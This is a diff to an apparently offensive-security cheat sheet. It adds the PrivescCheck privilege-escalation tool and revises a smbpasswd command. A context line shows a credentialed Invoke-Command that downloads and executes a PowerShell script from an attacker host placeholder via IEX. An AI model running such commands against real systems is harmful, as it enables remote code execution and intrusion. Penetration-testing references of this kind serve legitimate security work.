@@ -143,6 +143,7 @@ Thank you for reading.
 		- [powercat](#powercat)
 		- [Powermad](#powermad)
 		- [PowerShell](#powershell)
+  		- [PrivescCheck](#privesccheck)
 		- [pwncat](#pwncat)
 		- [rpcclient](#rpcclient)
 		- [Rubeus](#rubeus)
@@ -290,6 +291,7 @@ Thank you for reading.
 | PowerView.py | https://github.com/aniqfakhrul/powerview.py |
 | PPLdump | https://github.com/itm4n/PPLdump |
 | Priv2Admin | https://github.com/gtworek/Priv2Admin |
+| PrivescCheck | https://github.com/itm4n/PrivescCheck |
 | PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
 | pspy | https://github.com/DominicBreuker/pspy |
 | pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
@@ -4476,6 +4478,12 @@ $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME
 Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
 ```
 
+#### PrivescCheck
+
+```c
+. .\PrivescCheck.ps1; Invoke-PrivescCheck
+```
+
 #### pwncat
 
 ```c
@@ -4548,7 +4556,7 @@ srvinfo
 #### smbpasswd
 
 ```c
-smbpasswd -U <RHOST>\<USERNAME> -r <RHOST>
+smbpasswd -r <RHOST> -U <USERNAME>
 ```
 
 #### winexe
